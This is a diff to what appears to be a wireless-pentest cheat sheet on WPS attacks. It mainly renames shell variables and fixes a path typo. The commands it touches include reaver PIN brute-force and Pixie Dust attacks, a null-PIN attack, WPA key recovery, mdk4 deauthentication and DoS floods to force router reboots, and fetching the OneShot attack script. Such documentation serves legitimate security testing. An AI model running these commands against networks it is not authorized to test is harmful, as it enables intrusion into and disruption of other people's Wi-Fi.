@@ -46,13 +46,13 @@ The AP sends two hashes (E-Hash1, E-Hash2) in message M3. If the first half is w
 ::: code-group
 
 ```bash [airodump-ng]
-airodump-ng --wps $interface
+airodump-ng --wps $INTERFACE
 ```
 
 ```bash [wash]
 # more WPS-specific
-wash -i $interface
-wash -i $interface -j # more details
+wash -i $INTERFACE
+wash -i $INTERFACE -j # more details
 ```
 
 :::
@@ -78,26 +78,26 @@ Reaver acts as an external registrar and tries PINs sequentially. Because of the
 :::
 
 ```bash
-reaver -i $interface -b $bssid -c $channel -vv
+reaver -i $INTERFACE -b $BSSID -c $CHANNEL -vv
 ```
 
 ### With known first half
 
 ```bash
-reaver -i $interface -b $bssid -c $channel -p 1234 -vv
+reaver -i $INTERFACE -b $BSSID -c $CHANNEL -p 1234 -vv
 ```
 
 ### Null PIN attack (some APs accept an empty PIN) :
 
 ```bash
-# Null PIN attack (-p "" or -p "")
-reaver -i $interface -b $bssid -c $channel -p "" -vv
+# Null PIN attack (empty PIN)
+reaver -i $INTERFACE -b $BSSID -c $CHANNEL -p "" -vv
 ```
 
 ### Retrieve WPA key from known PIN :
 
 ```bash
-reaver -i $interface -b $bssid -p $pin
+reaver -i $INTERFACE -b $BSSID -p $PIN
 ```
 
 ## Phantom Locks & Rate Limiting
@@ -105,7 +105,7 @@ reaver -i $interface -b $bssid -p $pin
 Some APs return false "locked" messages due to bugs or interference. Reaver can ignore them:
 
 ```bash
-reaver -i $interface -b $bssid -c $channel -L -vv
+reaver -i $INTERFACE -b $BSSID -c $CHANNEL -L -vv
 
 -N           # Do not send NACK return back messages
 -d <seconds> # Set the delay between pin attempts 1
@@ -119,13 +119,13 @@ If the AP is locked, you can try to crash it and force a reboot. When it comes b
 
 ```bash
 # Authentication DoS
-mdk4 $interface a -a $bssid
+mdk4 $INTERFACE a -a $BSSID
 
 # Deauthentication flood
-mdk4 $interface d -c $channel
+mdk4 $INTERFACE d -c $CHANNEL
 
 # EAPoL-Start flood
-mdk4 $interface e -t $bssid
+mdk4 $INTERFACE e -t $BSSID
 ```
 
 ## Pre-Defined PINs (Default Algorithms)
@@ -137,10 +137,10 @@ Many vendors use predictable PINs based on the MAC address or other hardware ide
 
 ```bash
 # Generate candidate PINs from BSSID
-wpspin -A $bssid
+wpspin -A $BSSID
 ```
 
-- <a href="/assets/scrits/pin_guesser.sh" target="_blank" rel="noopener noreferrer">pin_guesser.sh</a> - a simple script to test all wpspin generated PINs.
+- <a href="/assets/scripts/pin_guesser.sh" target="_blank" rel="noopener noreferrer">pin_guesser.sh</a> - a simple script to test all wpspin generated PINs.
 
 For specific vendors:
 
@@ -156,7 +156,7 @@ Some chipsets (Ralink, MediaTek, Broadcom, Realtek) use weak random number gener
 ::: code-group
 
 ```bash [reaver]
-reaver -i $interface -b $bssid -c $channel -K 1 -vv
+reaver -i $INTERFACE -b $BSSID -c $CHANNEL -K 1 -vv
 ```
 
 ```bash [oneShot]
@@ -166,7 +166,7 @@ sudo apt install python3 wpasupplicant iw pixiewps
 wget https://raw.githubusercontent.com/fulvius31/OneShot/master/oneshot.py
 
 # Run
-sudo python3 oneshot.py -i $interface -b $bssid -K
+sudo python3 oneshot.py -i $INTERFACE -b $BSSID -K
 ```
 
 :::
@@ -179,12 +179,12 @@ If you have physical access to the AP, you can use WPS PBC to connect without th
 
 ```bash [Unix]
 # With wpa_cli
-wpa_cli wps_pbc $bssid
-dhclient $interface
+wpa_cli wps_pbc $BSSID
+dhclient $INTERFACE
 ```
 
 ```bash [oneShot]
-sudo python3 oneshot.py -i $interface --pbc
+sudo python3 oneshot.py -i $INTERFACE --pbc
 ```
 
 :::
